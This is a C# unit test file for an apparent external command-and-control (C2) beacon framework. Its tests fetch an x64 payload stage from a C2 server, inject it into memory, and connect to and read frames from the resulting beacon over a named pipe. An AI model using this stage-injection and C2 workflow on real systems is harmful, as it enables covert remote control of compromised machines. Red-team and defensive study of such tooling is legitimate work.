using System;
using System.Net;
using System.Threading.Tasks;

using Xunit;

namespace ExternalC2.UnitTests
{
    public class BeaconClientTests
    {
        [Fact]
        public async Task InjectStage()
        {
            var serverController = new Controller.BeaconController();
            serverController.Configure(IPAddress.Parse(Constants.Server), Constants.Port, Constants.Block);
            await serverController.Connect();
            
            var pipeName = Guid.NewGuid().ToString();
            var stage = await serverController.RequestStage(pipeName, Base.Architecture.x64);

            var clientController = new Client.BeaconController();
            var injected = clientController.InjectStage(stage);
            
            Assert.True(injected);
        }

        [Fact]
        public async Task ConnectToBeacon()
        {
            var serverController = new Controller.BeaconController();
            serverController.Configure(IPAddress.Parse(Constants.Server), Constants.Port, Constants.Block);
            await serverController.Connect();
            
            var pipeName = Guid.NewGuid().ToString();
            var stage = await serverController.RequestStage(pipeName, Base.Architecture.x64);

            var clientController = new Client.BeaconController();
            clientController.Configure(pipeName);
            clientController.InjectStage(stage);

            var connected = await clientController.Connect();
            Assert.True(connected);
        }

        [Fact]
        public async Task ReadFrameFromBeacon()
        {
            var serverController = new Controller.BeaconController();
            serverController.Configure(IPAddress.Parse(Constants.Server), Constants.Port, Constants.Block);
            await serverController.Connect();
            
            var pipeName = Guid.NewGuid().ToString();
            var stage = await serverController.RequestStage(pipeName, Base.Architecture.x64);

            var clientController = new Client.BeaconController();
            clientController.Configure(pipeName);
            clientController.InjectStage(stage);
            await clientController.Connect();

            var frame = await clientController.ReadFrame();
            
            Assert.NotNull(frame.Length);
            Assert.True(frame.Length.Length > 0);
            Assert.NotNull(frame.Data);
            Assert.True(frame.Data.Length > 0);
        }
    }
}